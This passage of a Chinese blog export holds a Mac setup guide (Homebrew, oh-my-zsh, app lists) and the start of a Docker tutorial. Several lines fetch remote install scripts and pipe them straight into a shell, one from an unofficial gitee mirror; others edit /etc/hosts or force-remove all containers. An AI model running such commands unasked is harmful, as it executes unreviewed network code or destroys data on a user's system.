172.30.*</span><br><span class="line">  - 172.31.*</span><br><span class="line">  - 192.168.*</span><br><span class="line">  - &lt;local&gt;</span><br><span class="line">cfw-latency-timeout: 5000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 深度使用技巧</title>
    <url>/2022/02/20/Mac-%E6%B7%B1%E5%BA%A6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="Mac-深度使用技巧"><a href="#Mac-深度使用技巧" class="headerlink" title="Mac 深度使用技巧"></a>Mac 深度使用技巧</h1><h2 id="首次激活"><a href="#首次激活" class="headerlink" title="首次激活"></a>首次激活</h2><h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3><ul>
<li>设置轻点来点按（跟踪速度7格）</li>
<li>设置三指拖移</li>
<li>程序坞移至左边</li>
<li>开启远程管理、远程登陆和文件共享</li>
</ul>
<h3 id="安装Homebrew"><a href="#安装Homebrew" class="headerlink" title="安装Homebrew"></a>安装Homebrew</h3><p><a href="https://brew.sh/">https://brew.sh/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">需要科学上网</span></span><br><span class="line">echo &quot;185.199.108.133 raw.githubusercontent.com</span><br><span class="line">140.82.113.3    github.com</span><br><span class="line">199.232.69.194  github.global.ssl.fastly.net&quot; &gt;&gt; /etc/hosts</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">卸载</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">恢复镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">无需科学上网</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装 选清华源</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="自动化脚本安装软件"><a href="#自动化脚本安装软件" class="headerlink" title="自动化脚本安装软件"></a>自动化脚本安装软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">bat 是一款可用在 Linux 命令行显示文件内容的工具，bat 命令功能跟常用命令 <span class="built_in">cat</span> 类似。只是 bat 功能上更加强大一些，bat 在 <span class="built_in">cat</span> 命令的基础上加入了行号显示、代码高亮和 Git 集成。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">fzf是一个通用的命令行模糊查找器, 通过输入模糊的关键词就可以定位文件或文件夹。结合其他工具(比如rg)可以完成非常多的工作，在工作中可以大幅提高你的工作效率。fzf可以用于文件、命令历史记录、进程、主机名、书签、git提交等。</span></span><br><span class="line"></span><br><span class="line">brew install bat docker-compose fzf git maven nvm wget telnet;</span><br><span class="line"></span><br><span class="line">brew install cask --no-quarantine another-redis-desktop-manager baidunetdisk dingtalk docker drawio google-chrome hiddenbar iina iterm2 jetbrains-toolbox visual-studio-code lepton maczip mounty oracle-jdk golang postman qiyimedia snipaste stats sunloginclient tencent-meeting vmware-fusion wechat qq neteasemusic discord bitwarden typora</span><br></pre></td></tr></table></figure>

<h2 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h2><h3 id="必装软件"><a href="#必装软件" class="headerlink" title="必装软件"></a>必装软件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alfred iterm2 iina idea typora stats ishot maczip transmit magnet google hidden bar yoink</span><br></pre></td></tr></table></figure>



<ul>
<li><a href="https://www.macwk.com/">https://www.macwk.com/</a></li>
<li>Redis Desktop manager redis 客户端工具</li>
<li>Alfred 4 搜索</li>
<li>Hidden Bar 菜单栏图标显示隐藏</li>
<li>IINA 视频播放器</li>
<li>Iterm 2 终端 </li>
<li>Jetbarins ToolBox  开发工具管理，可以用来安装开发工具</li>
<li>Mac zip  解压缩工具 </li>
<li>Mountry NTFS读写工具</li>
<li>Ishot截图软件</li>
<li>stats 用来展示系统状态</li>
<li>Path Finder Finder 辅助工具</li>
<li>Screen Flow 屏幕录制工具</li>
<li>Transmit  SFTP 文件服务器</li>
<li>Dowine 4  网站视频下载工具</li>
<li>Motrix      多线程下载工具</li>
<li>Rectangle 分屏工具</li>
<li>yoink    临时仓库</li>
<li>Terminus 终端工具</li>
<li>one switch 小工具(隐藏桌面,屏幕常亮)</li>
<li>柠檬清理 </li>
<li>Dev-sidecar(gitee) 开发者边车，github打不开，github 加速, git clone加速，google CDN加速，Stack Overflow加速</li>
<li>lepton 代码片段管理工具</li>
<li>Typora</li>
<li>discord</li>
<li>bitwarden</li>
<li>花生壳</li>
<li>网易有道词典</li>
<li>向日葵</li>
<li>cheatsheet</li>
<li>clashx</li>
<li>dash</li>
<li>discord</li>
<li>docker</li>
<li>draw.io</li>
<li>goland</li>
<li>idea</li>
<li>webstorm</li>
<li>Pycharm</li>
<li>google</li>
<li>magnet</li>
<li>office</li>
<li>microsoft remote desktop</li>
<li>Mongoldb compass</li>
<li>Navicat premium</li>
<li>Offset explorer 2</li>
<li>Pdf reader pro</li>
<li>picgo</li>
<li>postman</li>
<li>Regex101</li>
<li>teamviewer</li>
<li>todesk</li>
<li>transmit</li>
<li>visual studio code</li>
<li>Switchhost</li>
</ul>
<h2 id="软件技巧"><a href="#软件技巧" class="headerlink" title="软件技巧"></a>软件技巧</h2><h3 id="Iterm2"><a href="#Iterm2" class="headerlink" title="Iterm2"></a>Iterm2</h3><h4 id="配置云端存储"><a href="#配置云端存储" class="headerlink" title="配置云端存储"></a>配置云端存储</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202212337013.png" alt="image-20220221233708935"></p>
<h4 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br><span class="line"></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改主题</span></span><br><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">重载配置生效</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<ul>
<li>设置背景</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239513.png" alt="image-20211222140203521"></p>
<ul>
<li>Autosuggestion 命令自动补全</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">1.下载插件</span></span><br><span class="line">git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">2.配置</span> </span><br><span class="line">plugins=(git zsh-autosuggestions)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">3.加载配置</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<h3 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h3><h4 id="配置云端存储配置"><a href="#配置云端存储配置" class="headerlink" title="配置云端存储配置"></a>配置云端存储配置</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239528.png" alt="image-20211222141241785"></p>
<h3 id="短信同步配置"><a href="#短信同步配置" class="headerlink" title="短信同步配置"></a>短信同步配置</h3><p>配置苹果手机和苹果电脑短信同步</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2021/12/21/Docker/Docker/</url>
    <content><![CDATA[<h1 id="第一章-Docker概述"><a href="#第一章-Docker概述" class="headerlink" title="第一章 Docker概述"></a>第一章 Docker概述</h1><h2 id="1-1-虚拟化技术发展史"><a href="#1-1-虚拟化技术发展史" class="headerlink" title="1.1 虚拟化技术发展史"></a>1.1 虚拟化技术发展史</h2><p>在虚拟化技术出现之前，如果我们想搭建一台服务器，我们需要做如 下的工作:</p>
<ol>
<li><p>购买一台硬件服务器;</p>
</li>
<li><p>在硬件服务器上安装配置操作系统系统;</p>
</li>
<li><p>在操作系统之上配置应用运行环境; </p>
</li>
<li><p>部署并运行应用;</p>
</li>
</ol>
<p>这种方式的缺点就是:</p>
<ol>
<li><p>部署应用非常慢;</p>
</li>
<li><p>需要花费的成本非常高(时间成本、服务器成本);</p>
</li>
<li><p>应用迁移麻烦;要将应用迁移，又得重复部署应用的过程:购买 服务器 -&gt; 安装操作系统 OS -&gt; 配置运行环境 -&gt; 部署应用 所以，为了解决这个问题，后续出现了虚拟化技术。</p>
</li>
</ol>
<h2 id="1-2-虚拟化技术是什么？"><a href="#1-2-虚拟化技术是什么？" class="headerlink" title="1.2 虚拟化技术是什么？"></a>1.2 虚拟化技术是什么？</h2><p>虚拟化(英语:Virtualization)是一种计算机资源管理技术，是将计算 机的各种硬件资源，比如服务器、网络、CPU、内存及存储等，予以 抽象和转换后呈现出一套新的硬件资源环境，在这一套新的硬件环境 下可以安装我们的操作系统，部署我们的应用运行环境等，它打破计算机硬件资源不可切割的障碍，使我们可以比原本的计算机硬件资源 结构更好的方式来组合应用这些资源。             </p>
<h2 id="1-3-虚拟化技术的分类"><a href="#1-3-虚拟化技术的分类" class="headerlink" title="1.3 虚拟化技术的分类"></a>1.3 虚拟化技术的分类</h2><p>虚拟化一般分为：</p>
<p>虚拟化一般分为: <strong>硬件级虚拟化</strong>(hardware-level-virtualization) <strong>操作系统级虚拟化</strong>(os-level-virtualization)</p>
<p><strong>硬件级虚拟化</strong> 是运行在硬件之上的虚拟化技术，它的核心技术是 Hypervisor 发音 [,haipə’vaizə]，Hypervisor 是一种运行在基础物理服 务器硬件之上的软件层，可以虚拟化硬件资源，例如 cpu、硬盘、内 存资源等。然后我们可以通过在虚拟化出来的资源之上安装操作系统， 这也就是所谓的虚拟机。像 VMWare, VirtualBox 等都是使用该技术， 我们经常使用的桌面版的虚拟机 VMWare 就是采用这种虚拟化技术。 如下图所示:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131390.png" alt="image-20201216232406720"></p>
<h2 id="1-4-虚拟化技术的优缺点"><a href="#1-4-虚拟化技术的优缺点" class="headerlink" title="1.4 虚拟化技术的优缺点"></a>1.4 虚拟化技术的优缺点</h2><p><strong>优点</strong></p>
<p>一台物理服务器可以虚拟化出多个虚拟的服务器，让计算机资源得已充分利用；</p>
<p><strong>缺点</strong></p>
<ol>
<li>每创建一个虚拟机的时候，都会创建一个操作系统，这个操作系 统会占用很多资源，这样无疑大大的增加了资源的消耗，当安装的虚 拟机越多，资源消耗就越多。 </li>
<li>环境兼容性问题，开发时的环境运行正常，部署到虚拟机环境测 试则有可能发生错误;</li>
</ol>
<h2 id="1-5-容器技术的发展"><a href="#1-5-容器技术的发展" class="headerlink" title="1.5 容器技术的发展"></a>1.5 容器技术的发展</h2><p>基于硬件级虚拟化技术的缺点和不足，后续又发展出来了另一种虚拟 化技术，即操作系统级虚拟化技术;<br> <strong>操作系统级虚拟化</strong> 是运行在操作系统之上的虚拟化技术，它模拟的 是运行在一个操作系统上的多个不同进程，并将其封装在一个密闭的 容器里面，该技术也称为容器化技术。</p>
<p>在容器化技术领域，Docker 是目前最流行的一种实现。Docker 发布于 2013 年，Docker 基于 LXC 技术，LXC 是 Linux 平台上的容器化技 术实现。<br> 注:LXC 是 Linux Container 的简写，它是一种内核虚拟化技术，可 以提供轻量级的虚拟化，以便隔离进程和资源，它与宿主机使用同一 个内核，性能损耗小，这种技术是 Linux 提供的，但是直到 Docker 出世，该技术才被发挥出来。</p>
<h2 id="1-6-Docker的发展历史"><a href="#1-6-Docker的发展历史" class="headerlink" title="1.6 Docker的发展历史"></a>1.6 Docker的发展历史</h2><h2 id="1-7-Docker是什么"><a href="#1-7-Docker是什么" class="headerlink" title="1.7 Docker是什么"></a>1.7 Docker是什么</h2><ol>
<li>Docker 是一个开源的应用容器引擎，它基于 Google 公司推出的 Go 语言实现，项目代码托管在 GitHub 上进行维护; <a href="https://github.com/docker/docker-ce">https://github.com/docker/docker-ce</a></li>
<li>Docker 技术让开发者可以打包他们的应用以及依赖包到一个可移 植的容器中，打包好的容器可以发布到任何流行的 Linux 服务器上运 行，这样就可以解决开发环境与运维环境不一致的问题了，所以容器 技术解决了开发和运维之间的矛盾，让开发专注于开发，运维专注于 运维，不要被环境问题所打扰;</li>
<li>Docker彻底释放了虚拟化的威力，极大降低了计算机资源供应的成本，Docker重新定义了程序开发测试、交付和部署过程，Docker提出了“构建一次，到处运行”的理念，让应用的开发、测试、部署和分发都变得前所未有的高效和轻松！</li>
<li>Docker 是一种轻量级的操作系统虚拟化解决方案，Docker 的基础 是 Linux 容器(LXC)技术，在 LXC 的基础上 Docker 进行了进一步 的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户 操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单; Docker 自开源后受到广泛的关注，Docker最早是基于Ubuntu开发的， 但后续 CentOS、Debian、Fedora 等主流的 Linux 操作系统都支持 Docker;</li>
</ol>
<p>**总结:**简单地说，Docker 是对软件和其依赖环境的标准化打包，应用 之间相互隔离，共享一个 OS Kernel(解决了资源浪费的问题)，可 以运行在很多主流操作系统上;<br> 但是也需要澄清一下，Docker 本身不是容器，Docker 只是管理容器 的引擎。</p>
<h2 id="1-8-容器和虚拟机的区别"><a href="#1-8-容器和虚拟机的区别" class="headerlink" title="1.8 容器和虚拟机的区别"></a>1.8 容器和虚拟机的区别</h2><p>容器是将代码和环境的关系打包在一起的一个集合，而虚拟机是在物理层面上，分出来的一个操作系统；</p>
<p>多个容器可以运行在同一台物理服务器上，并共享一个操作系统内核资源。多个虚拟机也可以运行在同一台机器上，但每台虚拟机都需要一个完整的操作系统；</p>
<p>下图比较了Docker和传统虚拟化方式的不同之处：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131391.png" alt="image-20201216235006051"></p>
<p>可见容器是在本地操作系统层面上实现虚拟化，直接复用本地主机的操作系统，不需要单独安装操作系统，而传统的虚拟化技术方式则需要单独安装每个虚拟机的操作系统。</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody><tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘空间</td>
<td>一般为几十MB</td>
<td>一般为10GB</td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于原生</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
<tr>
<td>操作系统</td>
<td>与宿主机共享os</td>
<td>宿主机os上运行虚拟机os</td>
</tr>
</tbody></table>
<h2 id="1-9-为什么使用Docker"><a href="#1-9-为什么使用Docker" class="headerlink" title="1.9 为什么使用Docker"></a>1.9 为什么使用Docker</h2><p>作为一种新兴的虚拟化技术，Docker 跟传统的虚拟化方式相比具有 众多的优势。</p>
<ol>
<li><p>Docker 容器的启动可以在秒级实现，这相比传统的虚拟机方式要 快得多。</p>
</li>
<li><p>Docker 对系统资源的利用率很高，一台主机上可以同时运行数千 个 Docker 容器。 </p>
</li>
<li><p>容器除了运行其中的应用外，基本不消耗额外的系统资源，使得 应用的性能很高。传统虚拟机方式运行 10 个完全不同的应用可能我 们会起 10 个虚拟机来部署，而 Docker 只需要启动 10 个隔离的应用 即可。</p>
</li>
<li><p>Docker 可以更快速的交付和部署，大量地节约开发、测试、部署 的时间，对开发和运维人员来说，最希望的就是一次创建或配置，可 以在任意地方正常运行。</p>
</li>
<li><p>更高效的虚拟化，Docker 容器的运行不需要额外的 hypervisor 支 持，它是内核级的虚拟化，因此可以实现更高的性能和效率。</p>
</li>
<li><p>更轻松的迁移和扩展，Docker 容器几乎可以在任意的平台上运行， 包括物理机、虚拟机、公有云、私有云、个人电脑、服务器等，这种兼容性可以让用户轻松地把一个应用程序从一个平台直接迁移到另 一个平台。</p>
</li>
</ol>
<h1 id="第二章-Docker环境搭建"><a href="#第二章-Docker环境搭建" class="headerlink" title="第二章 Docker环境搭建"></a>第二章 Docker环境搭建</h1><h2 id="2-1-Docker的版本"><a href="#2-1-Docker的版本" class="headerlink" title="2.1 Docker的版本"></a>2.1 Docker的版本</h2><p>Docker 从 2013 年 3 月 20 日发布 Docker 0.1，到现在已经发布了多 个版本，从 2017 年 3 月开始 docker 在原来的基础上分为两个分 支版本: Docker CE 和 Docker EE。<br> Docker CE 即社区免费版，可永久免费使用;</p>
<p>Docker EE 即企业版，功能更全，更强调安全，但需付费使用; 本课程介绍 Docker CE 版本，目前 Docker 版本为 18.03<br> Docker 官方网站:<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<h2 id="2-2-Docker的安装"><a href="#2-2-Docker的安装" class="headerlink" title="2.2 Docker的安装"></a>2.2 Docker的安装</h2><p>首先，我们知道 Docker 并不是容器，它是一个管理容器的引擎。 我们课程采用的 Linux 版本是 CentOS 7，学习 Docker 也更推荐在 Linux 环境下使用;<br> Docker 支持 CentOS 6 及以后的版本;</p>
<p>CentOS7 系统可以直接通过 yum 进行安装: 安装前可以查看一下系统是否已经安装了 Docker:</p>
<p>yum list installed | grep docker<br> 安装:yum install docker -y<br> 安装后，使用 docker –version(docker version，docker -v)查看 docker 是否安装成功，<br> 卸载:<br> yum remove docker.x86_64 -y<br> yum remove docker-client.x86_64 -y<br> yum remove docker-common.x86_64 -y</p>
<h2 id="2-3-Docker服务启动"><a href="#2-3-Docker服务启动" class="headerlink" title="2.3 Docker服务启动"></a>2.3 Docker服务启动</h2><p>安装之后启动Docker服务;</p>
<p>启动:systemctl start docker 或者 service docker start </p>
<p>停止:systemctl stop docker 或者 service docker stop </p>
<p>重启:systemctl restart docker 或者 service docker restart 检查 docker 进程的运行状态:<br> systemctl status docker 或者 service docker status </p>
<p>查看 docker 进程:ps -ef | grep docker</p>
<h2 id="2-4-Docker服务信息"><a href="#2-4-Docker服务信息" class="headerlink" title="2.4 Docker服务信息"></a>2.4 Docker服务信息</h2><p>docker info 查看 docker 系统信息</p>
<p>docker 查看所有的帮助信息</p>
<p>docker commond –help 查看某个 commond 命令的帮助信息</p>
<h2 id="2-5-Docker使用"><a href="#2-5-Docker使用" class="headerlink" title="2.5 Docker使用"></a>2.5 Docker使用</h2><h3 id="2-5-1-Docker的运行机制"><a href="#2-5-1-Docker的运行机制" class="headerlink" title="2.5.1 Docker的运行机制"></a>2.5.1 Docker的运行机制</h3><p>我们知道 Docker 并不是容器，而只是一个管理容器的引擎;<br> Docker 的底层运行原理:<br> Docker 服务启动→下载镜像→启动该镜像得到一个容器→容器里运 行着我们想要的程序;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131392.png" alt="image-20201217001317678"></p>
<h3 id="2-5-2-第一个Docker容器"><a href="#2-5-2-第一个Docker容器" class="headerlink" title="2.5.2 第一个Docker容器"></a>2.5.2 第一个Docker容器</h3><p>Docker运行步骤:</p>
<ol>
<li>将Docker服务启动</li>
<li>下载一个镜像，Docker运行一个容器前需要本地存在有对应的镜像，如果镜像不存在，Docker会从镜像仓库下载(默认是 Docker Hub 公共注册服务器中的仓库 <a href="https://hub.docker.com)./">https://hub.docker.com)。</a></li>
</ol>
<p>CentOS 下怎么下载(pull)镜像?</p>
<p>从 docker hub 官网搜索要使用的镜像，也可以在命令行使用命令搜索要使用的镜像，比如 docker search tomcat 进行搜索，然后下载所需 要的镜像:<br> 下载镜像:docker pull tomcat</p>
<p>运行镜像:docker run tomcat 前台运行， 要后台运行，加参数 -d 显示本地已有的镜像:docker images</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131393.png" alt="image-20201217001937529"></p>
<p>在列出信息中，可以看到几个字段信息 </p>
<p>REPOSITORY:来自于哪个仓库，比如 docker.io&#x2F;tomcat TAG:镜像的标记，比如 latest<br> IMAGE ID:镜像的 ID 号(唯一) </p>
<p>CREATED:创建时间</p>
<p>SIZE:镜像大小</p>
<ol start="3">
<li>启动下载下来的镜像得到一个容器:<br> docker run -d docker.io&#x2F;tomcat 或者 docker run -d 41a54fe1f79d 默认是前台启动，如果需要后台启动，指定-d 参数;</li>
</ol>
<p>通过 ps -ef | grep tomcat 查看，检查 tomcat 镜像是否启动容器成功</p>
<h3 id="2-5-3-进入Docker容器"><a href="#2-5-3-进入Docker容器" class="headerlink" title="2.5.3 进入Docker容器"></a>2.5.3 进入Docker容器</h3><p>进入容器:docker exec -it cef0d139bfd6 bash<br> 其中 i 表示交互式的，也就是保持标准输入流打开; t 表示虚拟控制台，分配到一个虚拟控制台; </p>
<p>退出容器:exit</p>
<h3 id="2-5-4-客户机访问容器"><a href="#2-5-4-客户机访问容器" class="headerlink" title="2.5.4 客户机访问容器"></a>2.5.4 客户机访问容器</h3><p>从客户机上访问容器，需要有端口映射，docker 容器默认采用桥接模 式与宿主机通信，需要将宿主机的 ip 端口映射到容器的 ip 端口上; </p>
<p>停止容器:docker stop 容器 ID&#x2F;名称<br>启动容器:docker run -d -p 8080:8080 docker.io&#x2F;tomcat 或者 41a54fe1f79d</p>
<h1 id="第三章-Docker核心组件"><a href="#第三章-Docker核心组件" class="headerlink" title="第三章 Docker核心组件"></a>第三章 Docker核心组件</h1><h2 id="3-1-Docker架构"><a href="#3-1-Docker架构" class="headerlink" title="3.1 Docker架构"></a>3.1 Docker架构</h2><p>Docker使用客户端-服务器（C&#x2F;S）架构模式，使用远程API来管理和创建Docker容器。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131394.png" alt="image-20201217002508350"></p>
<p>Docker容器通过Docker镜像来创建。</p>
<p>镜像与容器的关系类似于面向对象编程中的类与对象的关系。</p>
<table>
<thead>
<tr>
<th>Docker</th>
<th>面向对象</th>
</tr>
</thead>
<tbody><tr>
<td>镜像</td>
<td>类</td>
</tr>
<tr>
<td>容器</td>
<td>对象</td>
</tr>
</tbody></table>
<h2 id="3-2-Docker核心要素"><a href="#3-2-Docker核心要素" class="headerlink" title="3.2 Docker核心要素"></a>3.2 Docker核心要素</h2><p>Docker包括三个核心要素</p>
<p><strong>镜像(Image)、容器(Container)、仓库(Repository)</strong></p>
<p> 理解了这三个概念，就理解了 Docker 的整个生命周期。 Docker 的运行离不开以上核心几个组件的支持，Docker 的成功也是 拜这几个组件所赐。<br> 有人会误以为，Docker 就是容器，但 Docker 不是容器，而是管理容 器的引擎。</p>
<h2 id="3-3-镜像"><a href="#3-3-镜像" class="headerlink" title="3.3 镜像"></a>3.3 镜像</h2><h3 id="3-3-1-镜像的基本概念"><a href="#3-3-1-镜像的基本概念" class="headerlink" title="3.3.1 镜像的基本概念"></a>3.3.1 镜像的基本概念</h3><p>Docker 镜像就是一个只读的模板，可以用来创建 Docker 容器。 例如:一个镜像可以包含一个完整的 centos 操作系统环境，里面仅 安装了 mysql 或用户需要的其它应用程序。<br> Docker 提供了一个非常简单的机制来创建镜像或者更新现有的镜像， 用户甚至可以直接从其他人那里下载一个已经做好的镜像来直接使 用。</p>
<h3 id="3-3-2-镜像的组成结构"><a href="#3-3-2-镜像的组成结构" class="headerlink" title="3.3.2 镜像的组成结构"></a>3.3.2 镜像的组成结构</h3><p>镜像是由许多层的文件系统叠加构成的，最下面是一个引导文件系统 bootfs，第二层是一个 root 文件系统 rootfs，root 文件系统通常是某 种操作系统，比如 centos、Ubuntu，在 root 文件系统之上又有很多 层文件系统，这些文件系统叠加在一起，构成 docker 中的镜像;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131395.png" alt="image-20201217003937572"></p>
<h3 id="3-3-3-镜像的日常操作"><a href="#3-3-3-镜像的日常操作" class="headerlink" title="3.3.3 镜像的日常操作"></a>3.3.3 镜像的日常操作</h3><ol>
<li><p>下载镜像，比如下载 redis 镜像:docker pull redis:latest<br> reids 是查询到的镜像名称，latest 是镜像的标签 tag 获取一个镜像有两种方式，一种是从官方镜像仓库下载，一种是自己 通过 Dockerfile 文件构建。</p>
<p>如果有官方镜像，我们就不必自己用 Dockerfile 文件构建了，除非官 方没有才会自己去 Dockerfile 文件构建</p>
</li>
<li><p>列出已经下载的镜像:docker images，或者 docker images redis </p>
</li>
<li><p>运行镜像:docker run -d redis 其中-d 表示在后台运行</p>
<p>然后通过 ps -ef | grep redis 可以查到 redis 进程</p>
</li>
<li><p>查看容器镜像的状态:docker ps<br> 通过 docker exec -it a8584016f9b6(镜像 ID) bash 进入 redis 容器 </p>
</li>
<li><p>删除镜像:docker rmi redis:latest 注意是 rmi，不是 rm，rm 是删 除容器;</p>
</li>
</ol>
<h2 id="3-4-容器"><a href="#3-4-容器" class="headerlink" title="3.4 容器"></a>3.4 容器</h2><h3 id="3-4-1-容器的基本概念"><a href="#3-4-1-容器的基本概念" class="headerlink" title="3.4.1 容器的基本概念"></a>3.4.1 容器的基本概念</h3><p>容器是从镜像创建的运行实例。它可以被启动、停止、删除。每个容器都是相互隔离的、保证安全平台。可以把看做一个简易版的 Linux 环境，包括 root 用户权限、进程空间、用户空间和网络空间和运行在其中的应用程序。</p>
<p>Docker利用容器来运行应用，镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131396.png" alt="image-20201217004722048"></p>
<h3 id="3-4-2-容器的日常操作"><a href="#3-4-2-容器的日常操作" class="headerlink" title="3.4.2 容器的日常操作"></a>3.4.2 容器的日常操作</h3><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态的容器重新启动。</p>
<p>通过镜像启动容器:docker run -d redis<br>查看运行中的容器:docker ps</p>
<p>查看所有的容器:docker ps -a<br>停止容器:docker stop 容器 id 或容器名称 </p>
<p>已经停止的容器，我们可以使用命令 docker start 来启动。 开启容器:docker start 容器 id 或容器名称<br>因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新建容器。</p>
<p>删除容器:docker rm 容器 id 或容器名称 </p>
<p>删除容器时，容器必须是停止状态，否则会报错; </p>
<p>进入容器:docker exec -it 容器 id 或容器名称 bash<br>还可以使用 docker inspect + 容器 id 或容器名称 查看容器的更多信息;<br> 停用全部运行中的容器:docker stop $(docker ps -q) </p>
<p>删除全部容器:docker rm ​$(docker ps -aq) </p>
<p>一条命令实现停用并删除容器:<br> docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</p>
